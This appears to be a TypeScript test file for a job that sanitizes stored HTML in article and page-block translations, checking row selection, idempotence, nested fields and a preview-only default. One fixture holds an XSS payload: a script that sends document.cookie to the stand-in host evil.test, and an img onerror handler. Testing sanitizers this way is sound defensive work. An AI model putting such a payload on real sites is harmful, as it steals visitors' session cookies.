import assert from 'node:assert/strict'
import test from 'node:test'
import { planBlockFixes, planTranslationFixes } from '../server/services/stored-html-sanitize'
import { sanitizeHtml } from '../server/utils/sanitize-html'

/**
 * Lượt dọn một lần đưa HTML đã lưu (bản dịch bài viết, bản dịch khối trang) về
 * dạng đã lọc. Phần quyết định "hàng nào đổi" là hàm thuần nên kiểm ở đây; phần
 * đọc/ghi DB chạy bằng `npm run db:sanitize-html`.
 */

const BAD = '<p>Xin chào</p><script>fetch("//evil.test/?c="+document.cookie)</script><img src=x onerror="alert(1)">'
const GOOD = '<h2>Tiêu đề</h2><p>Đoạn <strong>đậm</strong>.</p>'

test('only translation rows whose content changes are returned', () => {
  const fixes = planTranslationFixes([
    { id: 1, content: GOOD },
    { id: 2, content: BAD },
    { id: 3, content: null },
    { id: 4, content: '' },
  ])
  assert.deepEqual(fixes.map(fix => fix.id), [2])
  assert.equal(fixes[0]!.content, sanitizeHtml(BAD))
  assert.doesNotMatch(fixes[0]!.content, /<script|onerror/i)
})

test('the pass is idempotent: cleaned rows produce no further fixes', () => {
  const [first] = planTranslationFixes([{ id: 2, content: BAD }])
  assert.deepEqual(planTranslationFixes([{ id: 2, content: first!.content }]), [])
})

test('block data is fixed inside translations as well as at the top level', () => {
  const fixes = planBlockFixes([
    { id: 10, data: { html: GOOD, title: 'giữ nguyên' } },
    { id: 11, data: { html: GOOD, translations: { en: { html: BAD, title: 'Plain' } } } },
    { id: 12, data: { bodyHtml: BAD } },
    { id: 13, data: null },
  ])
  assert.deepEqual(fixes.map(fix => fix.id), [11, 12])
  const translations = fixes[0]!.data.translations as Record<string, Record<string, string>>
  assert.doesNotMatch(translations.en!.html!, /<script|onerror/i)
  assert.equal(translations.en!.title, 'Plain')
  assert.equal(fixes[0]!.data.html, GOOD, 'clean top-level fields are untouched')
})

test('planning never mutates the rows it was given', () => {
  const row = { id: 11, data: { translations: { en: { html: BAD } } } }
  const snapshot = JSON.stringify(row)
  planBlockFixes([row])
  assert.equal(JSON.stringify(row), snapshot)
})

test('the default run is a preview and only --apply writes', async () => {
  const { readFile } = await import('node:fs/promises')
  const service = await readFile(new URL('../server/services/stored-html-sanitize.ts', import.meta.url), 'utf8')
  assert.match(service, /const apply = options\.apply === true/)
  assert.equal((service.match(/if \(apply\)/g) ?? []).length, 2, 'both tables write only under apply')
  const script = await readFile(new URL('../scripts/sanitize-stored-html.ts', import.meta.url), 'utf8')
  assert.match(script, /process\.argv\.includes\('--apply'\)/)
})
